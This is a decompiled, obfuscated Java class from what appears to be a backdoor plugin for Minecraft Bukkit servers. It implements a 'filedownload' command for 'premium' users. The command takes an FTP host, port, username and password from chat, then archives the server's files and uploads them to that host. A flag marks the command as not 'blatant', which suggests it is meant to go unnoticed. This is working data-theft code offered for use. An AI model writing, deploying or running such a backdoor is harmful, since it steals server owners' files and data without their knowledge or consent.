/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.io.File;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.FileUtil;
import me.system.runner.utils.Settings;
import me.system.runner.utils.zipserver;
import org.bukkit.entity.Player;

public class FiledownloadCommand
extends Command {
    public static /* synthetic */ String ftp_password;
    public static /* synthetic */ String ftp_username;
    /* synthetic */ File file;
    public static /* synthetic */ String ftp_port_string;
    public static /* synthetic */ int ftp_port;
    public static /* synthetic */ String ftp_server;

    @Override
    public void execute(Core lllllllllllllIlIIIIlIlIllIIIllll, String lllllllllllllIlIIIIlIlIllIIlIIlI, String[] lllllllllllllIlIIIIlIlIllIIlIIIl, Player lllllllllllllIlIIIIlIlIllIIlIIII) {
        if (lllllllllllllIlIIIIlIlIllIIIllll.premium.contains(lllllllllllllIlIIIIlIlIllIIlIIII.getName())) {
            if (lllllllllllllIlIIIIlIlIllIIlIIIl.length <= 3) {
                lllllllllllllIlIIIIlIlIllIIlIIII.sendMessage(Settings.USAGE("filedownload <ftp url or ip> <ftp port> <ftp username> <ftp password>"));
            } else {
                ftp_server = lllllllllllllIlIIIIlIlIllIIlIIIl[1];
                ftp_port_string = lllllllllllllIlIIIIlIlIllIIlIIIl[2];
                ftp_username = lllllllllllllIlIIIIlIlIllIIlIIIl[3];
                ftp_password = lllllllllllllIlIIIIlIlIllIIlIIIl[4];
                zipserver.dump();
                lllllllllllllIlIIIIlIlIllIIlIIII.sendMessage(Settings.PREFIX("File currently being archived and uploaded!  DO NOT STOP THE SERVER! (You will NOT get a message once it is done! Simply check the FTP server!)"));
            }
        } else {
            lllllllllllllIlIIIIlIlIllIIlIIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("premium ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    public FiledownloadCommand() {
        FiledownloadCommand lllllllllllllIlIIIIlIlIllIIllIIl;
        lllllllllllllIlIIIIlIlIllIIllIIl.file = FileUtil.getUserDir();
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    static {
        ftp_server = "";
        ftp_port_string = "1";
        ftp_port = Integer.parseInt(ftp_port_string);
        ftp_username = "";
        ftp_password = "";
    }
}

